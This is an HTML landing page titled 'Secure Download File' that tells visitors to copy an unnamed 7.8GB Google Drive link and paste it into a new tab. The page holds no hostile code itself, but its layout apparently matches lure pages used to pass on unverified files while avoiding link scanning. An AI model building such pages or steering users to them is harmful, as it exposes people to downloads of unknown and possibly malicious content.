<!DOCTYPE html>

<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Secure Download File</title>
    
    <link href="./new_files/css2" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #008080, #ff7043);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .download-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 800px;
        }

        .heading {
            text-align: center;
            color: #333;
            font-size: 24px;
            margin-bottom: 30px;
        }

        .copy-section {
            position: relative;
            margin: 20px 0;
        }

        .copy-badge {
            position: absolute;
            top: -7rem;
            left: -21px;
            background: #4cd3c2;
            color: white;
            padding: 8px 15px;
            border-radius: 5px;
            font-weight: 500;
            font-size: 0.9rem;
            transform: rotate(-3deg);
            box-shadow: 3px 3px 0 rgba(0,0,0,0.1);
        }

        .copy-instruction {
            text-align: center;
            color: #666;
            margin-bottom: 15px;
        }

        .link-input {
            width: 100%;
            padding: 12px;
            background: #f5f5f5;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
            margin-bottom: 20px;
        }

        .copy-btn {
            display: block;
            width: fit-content;
            margin: 0 auto;
            padding: 10px 24px;
            background: #5d4b63;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background 0.3s;
        }

        .copy-btn:hover {
            background: #4a3b4f;
        }

        .success-message {
            color: #4cd3c2;
            text-align: center;
            margin-top: 10px;
            display: none;
        }

        .password-text {
            text-align: center;
            color: #903ebd;
            font-size: 24px;
            margin-top: 20px;
        }
    </style>
</head>

<body>
    <div class="download-container">
        <h1 class="heading">FILE IS READY FOR DOWNLOAD...</h1>
        
        <div class="copy-section">
            <div class="copy-badge">COPY THIS LINK</div>
            <p class="copy-instruction">Copy link and paste into new tab to start download</p>
            <input type="text" class="link-input" id="txtfile" value="https://drive.google.com/uc?id=1B3l67Hj4m25lqcLqcBrGw6XXzsA_eBYh
" readonly="">
            <button class="copy-btn" onclick="copyLink()">Copy Link</button>
            
        </div>

        <p class="password-text">File size: 7.8GB</p>
    </div>

    <script>
        function copyLink() {
            var copyLink = document.getElementById("txtfile");
            copyLink.select();
            document.execCommand("copy");
            var alert = document.getElementById("showclass");
            alert.style.display = "block";
        }
    </script>



</body></html>
